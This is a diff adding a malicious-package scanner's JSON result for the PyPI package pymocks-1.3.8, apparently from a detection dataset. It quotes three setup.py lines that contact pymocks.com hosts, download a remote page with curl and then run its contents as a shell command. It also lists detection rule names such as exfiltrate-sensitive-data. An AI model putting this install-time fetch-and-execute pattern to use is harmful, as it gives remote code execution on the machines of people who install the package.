@@ -1,0 +1,34 @@
+{
+    "issues": 3,
+    "errors": {},
+    "results": {
+        "exec-base64": {},
+        "clipboard-access": {},
+        "obfuscation": {},
+        "silent-process-execution": {},
+        "steganography": {},
+        "dll-hijacking": {},
+        "cmd-overwrite": {},
+        "exfiltrate-sensitive-data": {},
+        "code-execution": [
+            {
+                "location": "setup.py:14",
+                "code": "    subprocess.getoutput('dig setup.dns.pymocks.com')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:15",
+                "code": "    banner = subprocess.getoutput('curl http://api.pymocks.com/pymocksdisplaymsg.html')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "setup.py:16",
+                "code": "    subprocess.getoutput(str(banner))\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "download-executable": {},
+        "shady-links": {}
+    },
+    "path": "./dataset/pypi/pymocks-1.3.8"
+}
